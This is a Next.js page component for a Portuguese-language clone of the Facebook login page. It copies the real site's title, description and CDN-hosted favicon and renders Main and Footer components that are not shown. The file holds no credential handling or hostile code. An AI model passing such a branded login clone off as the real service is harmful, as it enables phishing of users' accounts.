import { Footer } from '@/components/Footer'
import { Main } from '@/components/Main'
import Head from 'next/head'
import Image from 'next/image'


export default function Home() {
  return (
    <>
      <Head>
        <title>Facebook - entre ou cadastre-se</title>
        <link rel="preconnect" href="https://fonts.googleapis.com"/>
        <link rel="preconnect" href="https://fonts.gstatic.com"/>
        <meta name="description" content="Entre no Facebook para começar a compartilhar e se conectar com seus amigos, 
        familiares e com as pessoas que você conhece." />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" />
        <link rel="icon" href="./favicon.ico" />
        <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700;900&display=swap" rel="stylesheet"/>
      </Head>
      <main className='pt-10 w-full grid place-items-center desktop:pb-5 desktop:pt-0 desktop:min-h-screen desktop:pb-0 desktop:bg-main-gray'>
        <Main />
      </main>
      <footer className='px-10 lg:px-0 w-full '>
        <Footer />
      </footer>
    </>
  )
}
